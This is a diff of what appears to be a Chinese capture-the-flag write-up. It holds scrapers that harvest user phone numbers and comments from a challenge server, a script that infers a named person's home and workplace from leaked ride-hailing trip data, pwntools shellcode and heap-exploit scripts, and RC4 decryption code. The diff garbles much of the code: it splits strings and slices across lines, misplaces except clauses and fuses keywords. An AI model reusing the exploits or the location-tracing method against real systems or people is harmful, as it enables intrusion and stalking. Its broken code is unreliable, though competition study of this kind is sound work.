@@ -310,7 +310,8 @@ from bs4 import BeautifulSoup
 import time
 import pandas as pd
 
-BASE_URL = "http://47.117.186.156:33088"
+BASE_URL = "http://47.117.186.156:
+33088"
 HEADERS = {
     "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36",
     "Cookie": "PHPSESSID=meth5ucqp7rc26dtbvf93qof2g",  # 替换为你自己的
@@ -345,11 +346,13 @@ defget_comments(product_id):
                 "phone": phone,
                 "comment": comment
             })
-        except Exception as e:
+        
+except Exception as e:
             print(f"解析评论失败: {e}")
 
 defrun_scraper():
-    total_pages = 84# 示例先爬5页，可以调整为 84
+    total_pages = 84
+# 示例先爬5页，可以调整为 84
     for page inrange(1, total_pages + 1):
         print(f"爬取第 {page} 页商品列表...")
         product_ids = get_product_ids(page)
@@ -382,8 +385,10 @@ defpredict_sentiment(text):
         s = SnowNLP(str(text))
         # 返回值在0~1之间，>0.5是正向，<=0.5是负向
         return1if s.sentiments > 0.5else0
-    except:
-        return0# 默认负面
+    
+except:
+        return0
+# 默认负面
 
 df['label'] = df['comment'].apply(predict_sentiment)
 
@@ -409,7 +414,8 @@ from bs4 import BeautifulSoup
 import time
 import pandas as pd
 
-BASE_URL = "http://47.117.186.156:33088"
+BASE_URL = "http://47.117.186.156:
+33088"
 HEADERS = {
     "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
     "Cookie": "PHPSESSID=meth5ucqp7rc26dtbvf93qof2g"# 请替换为你的有效会话ID
@@ -430,7 +436,8 @@ defget_product_list(page=1):
             product_name = card.select_one('.product-name').text.strip()
             sales_text = card.select_one('.product-sales').text.strip()  # 月销量: XXX件
             sales_num = int(''.join(filter(str.isdigit, sales_text)))
-        except Exception as e:
+        
+except Exception as e:
             print(f"解析首页产品失败: {e}")
             continue
 
@@ -450,7 +457,8 @@ defget_product_comments(product_id):
     return comments
 
 defrun_product_scraper():
-    total_pages = 84# 建议先测试前 5 页，平台总页数是 84
+    total_pages = 84
+# 建议先测试前 5 页，平台总页数是 84
     for page inrange(1, total_pages + 1):
         print(f"正在爬取第 {page} 页商品列表...")
         products = get_product_list(page)
@@ -522,7 +530,8 @@ defclean_sales(s):
     try:
         val = int(re.sub(r"D", "", str(s)))
         return val if val > 0else0
-    except:
+    
+except:
         return0
 
 full_df['sales'] = full_df['sales'].apply(clean_sales)
@@ -551,7 +560,8 @@ from bs4 import BeautifulSoup
 import pandas as pd
 import time
 
-BASE_URL = "http://47.117.186.156:33088"
+BASE_URL = "http://47.117.186.156:
+33088"
 HEADERS = {
     "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
     "Cookie": "PHPSESSID=meth5ucqp7rc26dtbvf93qof2g"# ⚠️ 替换为你的有效 Cookie
@@ -583,7 +593,8 @@ defget_review_users(product_id):
                 'phone': phone,
                 'user_agent': user_agent
             })
-        except Exception as e:
+        
+except Exception as e:
             print(f"跳过一个评论，原因：{e}")
 
 defrun_scraper():
@@ -657,7 +668,8 @@ print("✅ 成功生成 submit_3.csv，已完成脱敏与宽松恶意检测！")
 数据社工1
 
 用脚本跑某滴泄露数据，提取出可能是张华强的经纬度，然后去地图数据搜索经纬度得到
-华润国际E区:闵行区星辰信息技术园
+华润国际E区:
+闵行区星辰信息技术园
 
 import os
 import sqlite3
@@ -672,7 +684,8 @@ DB_FOLDER = './某滴泄露的行程数据/'
 defis_weekday(date_str):
     try:
         return datetime.strptime(date_str, "%Y-%m-%d").weekday() < 5
-    except:
+    
+except:
         returnFalse
 
 # 是否为工作地关键词
@@ -704,7 +717,8 @@ for filename insorted(os.listdir(DB_FOLDER)):
                 "lng": float(lng),
                 "filename": filename
             })
-    except Exception as e:
+    
+except Exception as e:
         print(f"读取 {filename} 出错：{e}")
     finally:
         conn.close()
@@ -735,7 +749,8 @@ for phone, records in people.items():
         commute_days += 1
 
     if commute_days < 5:
-        continue# 过滤通勤太少的
+        continue
+# 过滤通勤太少的
 
     # 统计出现频率最高的 home、work 地点
     home_common = Counter(home_locations).most_common(1)
@@ -775,7 +790,8 @@ folium.Marker(location=home_loc, popup="🏡 居住地", icon=folium.Icon(color=
 folium.Marker(location=work_loc, popup=f"🏢 工作地：{work_name}", icon=folium.Icon(color='red', icon='briefcase')).add_to(m)
 
 # 画线
-for home, work in paths[:100]:
+for home, work in paths[:
+100]:
     folium.PolyLine([home, work], color='blue', weight=1, opacity=0.4).add_to(m)
 
 # 保存地图
@@ -790,7 +806,8 @@ print("✅ 地图保存为：张华强_行程地图.html")
 # 工作地点名称：张**
 # ✅ 地图保存为：张华强_行程地图.html
 
-# 华润国际E区:闵行区星辰信息技术园
+# 华润国际E区:
+闵行区星辰信息技术园
 
 数据社工2，3
 
@@ -877,11 +894,6 @@ def main():
 
 if __name__ == "__main__":
     main()
-```
-
-
-
-```
 and esi, ecx
 push rsi
 mov r11, 0x00ff732fffffff2f
@@ -898,11 +910,6 @@ push r14
 pop rsi
 mov edx, 0
 syscall
-```
-
-
-
-```
 脚本：
 from pwn import *
 context.arch = 'amd64'
@@ -924,11 +931,6 @@ shellcode = b'x95x00x8bx52x2fxf2xbax2axe2x5dx43x22x87x44xa4x6bx56x03xccx31x94xca
 pause()
 p.sendlineafter(b"magic data:n", shellcode)
 p.interactive()
-```
-
-
-
-```
 from pwn import *
 libc = ELF("./libc-2.31.so")
 # context.log_level = 'debug'
@@ -978,11 +980,6 @@ add(0x38)   # 10
 edit(10, p64(one_gadget))
 free(0)
 p.interactive()
-```
-
-
-
-```
 __int64 __fastcall main(int a1, char **a2, char **a3)
 {
 
@@ -1006,11 +1003,6 @@ while ( v6 != -1 );
   fclose(s);
 return0LL;
 }
-```
-
-
-
-```
 void *__fastcall enc(char *input_buffer, unsigned int length, size_t n_1)
 {
   input_len = 0;
@@ -1063,21 +1055,11 @@ else
     return dest;
   }
 }
-```
-
-
-
-```
 // positive sp value has been detected, the output may be wrong!
 char __fastcall sub_404088(char a1)
 {
   return (((16 * ((a1 - 1) & 0xF)) | ((__int64)(unsigned __int8)(a1 - 1) >> 4) & 0xF) ^ 0xB2) + 7;
 }
-```
-
-
-
-```
 src_data = open("./info_0c743b3.ori", "rb").read()
 key = "103906d6c9429372"
 
@@ -1131,11 +1113,6 @@ withopen("./info_0c743b3.ori.en.my", "w") as f:
         result = translate(enc_result)
         f.write(result)
         f.write("rn")
-```
-
-
-
-```
 key = "103906d6c9429372"
 
 defrc4_init_sbox(key):
@@ -1186,29 +1163,15 @@ for line in content:
         result += chr(i)
 
 open("./info_0c743b3.ori", "wb").write(result.encode())
-```
-
-
-
-```
 tshark -r test.pcapng -T fields -Y "http and http.request.uri.query.parameter contains "fl4g_1s_here"" -e "http.request.uri.query.parameter" > data.txt
-```
-
-
-
-```
 tcp contains "upload" and http.request.method==POST
-```
-
-
-
-```
 import requests
 from bs4 import BeautifulSoup
 import time
 import pandas as pd
 
-BASE_URL = "http://47.117.186.156:33088"
+BASE_URL = "http://47.117.186.156:
+33088"
 HEADERS = {
     "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36",
     "Cookie": "PHPSESSID=meth5ucqp7rc26dtbvf93qof2g",  # 替换为你自己的
@@ -1243,11 +1206,13 @@ defget_comments(product_id):
                 "phone": phone,
                 "comment": comment
             })
-        except Exception as e:
+        
+except Exception as e:
             print(f"解析评论失败: {e}")
 
 defrun_scraper():
-    total_pages = 84# 示例先爬5页，可以调整为 84
+    total_pages = 84
+# 示例先爬5页，可以调整为 84
     for page inrange(1, total_pages + 1):
         print(f"爬取第 {page} 页商品列表...")
         product_ids = get_product_ids(page)
@@ -1264,11 +1229,6 @@ defrun_scraper():
 
 if __name__ == "__main__":
     run_scraper()
-```
-
-
-
-```
 import pandas as pd
 from snownlp import SnowNLP
 import hashlib
@@ -1282,8 +1242,10 @@ defpredict_sentiment(text):
         s = SnowNLP(str(text))
         # 返回值在0~1之间，>0.5是正向，<=0.5是负向
         return1if s.sentiments > 0.5else0
-    except:
-        return0# 默认负面
+    
+except:
+        return0
+# 默认负面
 
 df['label'] = df['comment'].apply(predict_sentiment)
 
@@ -1299,17 +1261,13 @@ output_df = df[['user_id', 'label', 'signature']].sort_values(by='user_id')
 output_df.to_csv("submit_1.csv", index=False, encoding='utf-8')
 
 print("✅ submit_1.csv 已生成，准备提交平台评分！")
-```
-
-
-
-```
 import requests
 from bs4 import BeautifulSoup
 import time
 import pandas as pd
 
-BASE_URL = "http://47.117.186.156:33088"
+BASE_URL = "http://47.117.186.156:
+33088"
 HEADERS = {
     "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
     "Cookie": "PHPSESSID=meth5ucqp7rc26dtbvf93qof2g"# 请替换为你的有效会话ID
@@ -1330,7 +1288,8 @@ defget_product_list(page=1):
             product_name = card.select_one('.product-name').text.strip()
             sales_text = card.select_one('.product-sales').text.strip()  # 月销量: XXX件
             sales_num = int(''.join(filter(str.isdigit, sales_text)))
-        except Exception as e:
+        
+except Exception as e:
             print(f"解析首页产品失败: {e}")
             continue
 
@@ -1350,7 +1309,8 @@ defget_product_comments(product_id):
     return comments
 
 defrun_product_scraper():
-    total_pages = 84# 建议先测试前 5 页，平台总页数是 84
+    total_pages = 84
+# 建议先测试前 5 页，平台总页数是 84
     for page inrange(1, total_pages + 1):
         print(f"正在爬取第 {page} 页商品列表...")
         products = get_product_list(page)
@@ -1382,11 +1342,6 @@ defrun_product_scraper():
 
 if __name__ == "__main__":
     run_product_scraper()
-```
-
-
-
-```
 import pandas as pd
 import re
 from sklearn.feature_extraction.text import TfidfVectorizer
@@ -1424,7 +1379,8 @@ defclean_sales(s):
     try:
         val = int(re.sub(r"D", "", str(s)))
         return val if val > 0else0
-    except:
+    
+except:
         return0
 
 full_df['sales'] = full_df['sales'].apply(clean_sales)
@@ -1443,17 +1399,13 @@ final_df['reviews_number'] = final_df['reviews_number'].fillna(0).astype(int)
 final_df = final_df.sort_values(by='product_id')
 final_df.to_csv("submit_2.csv", index=False, encoding='utf-8')
 print("✅ submit_2.csv 已成功生成！")
-```
-
-
-
-```
 import requests
 from bs4 import BeautifulSoup
 import pandas as pd
 import time
 
-BASE_URL = "http://47.117.186.156:33088"
+BASE_URL = "http://47.117.186.156:
+33088"
 HEADERS = {
     "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
     "Cookie": "PHPSESSID=meth5ucqp7rc26dtbvf93qof2g"# ⚠️ 替换为你的有效 Cookie
@@ -1485,7 +1437,8 @@ defget_review_users(product_id):
                 'phone': phone,
                 'user_agent': user_agent
             })
-        except Exception as e:
+        
+except Exception as e:
             print(f"跳过一个评论，原因：{e}")
 
 defrun_scraper():
@@ -1504,11 +1457,6 @@ defrun_scraper():
 
 if __name__ == "__main__":
     run_scraper()
-```
-
-
-
-```
 import pandas as pd
 import re
 
@@ -1555,11 +1503,6 @@ df['code_check'] = df['user_agent'].apply(lambda ua: 'FALSE'if is_malicious_u
 submit_df = df[['user_id', 'desensitization', 'code_check']].sort_values(by='user_id')
 submit_df.to_csv("submit_3.csv", index=False, encoding='utf-8')
 print("✅ 成功生成 submit_3.csv，已完成脱敏与宽松恶意检测！")
-```
-
-
-
-```
 import os
 import sqlite3
 from collections import defaultdict, Counter
@@ -1573,7 +1516,8 @@ DB_FOLDER = './某滴泄露的行程数据/'
 defis_weekday(date_str):
     try:
         return datetime.strptime(date_str, "%Y-%m-%d").weekday() < 5
-    except:
+    
+except:
         returnFalse
 
 # 是否为工作地关键词
@@ -1605,7 +1549,8 @@ for filename insorted(os.listdir(DB_FOLDER)):
                 "lng": float(lng),
                 "filename": filename
             })
-    except Exception as e:
+    
+except Exception as e:
         print(f"读取 {filename} 出错：{e}")
     finally:
         conn.close()
@@ -1636,7 +1581,8 @@ for phone, records in people.items():
         commute_days += 1
 
     if commute_days < 5:
-        continue# 过滤通勤太少的
+        continue
+# 过滤通勤太少的
 
     # 统计出现频率最高的 home、work 地点
     home_common = Counter(home_locations).most_common(1)
@@ -1676,7 +1622,8 @@ folium.Marker(location=home_loc, popup="🏡 居住地", icon=folium.Icon(color=
 folium.Marker(location=work_loc, popup=f"🏢 工作地：{work_name}", icon=folium.Icon(color='red', icon='briefcase')).add_to(m)
 
 # 画线
-for home, work in paths[:100]:
+for home, work in paths[:
+100]:
     folium.PolyLine([home, work], color='blue', weight=1, opacity=0.4).add_to(m)
 
 # 保存地图
@@ -1691,7 +1638,8 @@ print("✅ 地图保存为：张华强_行程地图.html")
 # 工作地点名称：张**
 # ✅ 地图保存为：张华强_行程地图.html
 
-# 华润国际E区:闵行区星辰信息技术园
+# 华润国际E区:
+闵行区星辰信息技术园
 ```
 
 
